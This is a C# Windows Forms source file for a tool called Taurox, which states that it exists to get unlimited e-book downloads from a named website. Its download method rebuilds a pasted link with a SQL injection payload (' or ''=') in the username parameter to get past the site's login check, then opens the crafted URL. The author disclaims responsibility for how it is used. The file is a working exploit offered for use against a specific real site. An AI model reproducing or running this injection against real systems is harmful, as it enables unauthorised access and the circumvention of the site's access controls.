using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace dummieHack
{

    /* US:
     * <Taurox is a program designed for an unlimited dowload of documents (e-books) of the website>
     * "Libros Tauro" (http://www.librostauro.com.ar/) >
     * CopyLeft (C) <2012>  <Juan José Ruiz de Castilla>
     * This program is free software: you can redistribute it and/or modify
     * it under the terms of the GNU General Public License as published by
     * the Free Software Foundation, either version 3 of the License (GPLv3), or
     * (at your option) any later version.
     * This program is distributed in the hope that it will be useful,
     * but WITHOUT ANY WARRANTY; without even the implied warranty of
     * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     * GNU General Public License for more details.
     * You should have received a copy of the GNU General Public License
     * along with this program.  If not, see <http://www.gnu.org/licenses/>
     * 
     * ES:
     * <Taurox es un programa diseñado para obtener de manera ilimitada documentos (libros) de la página web>
     * "Libros Tauro" (http://www.librostauro.com.ar/) >
     *  CopyLeft (C) <2012>  <Juan José Ruiz de Castilla>
     *  Este programa es un software libre: tu puedes redistribuirlo y/o modificarlo
     *  bajo los terminos de GNU Licencia pública general publicada por 
     *  the Free Software Foundation,  ya sea la versión 3 de la Licencia (GPLv3), o
     * (A su elección) cualquier versión posterior.
     * Este programa es distribuido con la esperanza que sea útil,
     * pero SIN NINGUNA GARANTIA; incluso sin la garantía implícita de
     * COMERCIALIZACIÓN O IDONEIDAD POR UN PROPÓSITO EN PARTICULAR. Ver la 
     * GNU General Public License para más detalles.
     * Debería haber recibido una copia de la GNU General Public Licence
     * junto con este programa. Si no es así, ver <http://www.gnu.org/licenses/>
     * 
     */

    public partial class FrmPrincipal : Form
    {
        const string comilla = "\"";
        const string saltoLinea = "\n";

        public FrmPrincipal()
        {
            InitializeComponent();

            setearTextoIntro();

        }


        public void setearTextoIntro()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("Esta aplicación sirve exclusivamente para obtener acceso ilimitado a la descarga de libros de la Web ");
            sb.Append(comilla);
            sb.Append(" Libros Tauro ");
            sb.Append(comilla);
            sb.Append(" : http://www.librostauro.com.ar/librostauro.php. ");
            sb.Append(saltoLinea);
            sb.Append("El autor no se hace responsable del uso que pueda darle a la misma.");

            txtIntro.Text = sb.ToString();

        }

        private void setearTextoIntroIngles() { 
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void btnDescargar_Click(object sender, EventArgs e)
        {

            descargarLibro(txtLink.Text);
        }

        public void descargarLibro(string link)
        {
            string link2;
            string archivo;
            try
            {
                link2 = link.Substring(0, 98) + "&usuario=' or ''='&bajarch=";
                archivo = link.Substring(124, 12);

                link = link2 + archivo;

                System.Diagnostics.Process.Start(link);

            }

            catch { }

            finally
            {
                link2 = null;
                archivo = null;
            }


        }

        private void button1_Click(object sender, EventArgs e)
        {
            txtLink.Text = string.Empty;
        }

        private void acercaDeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            About about = new About();
            about.ShowDialog(this);
        }


    }
}
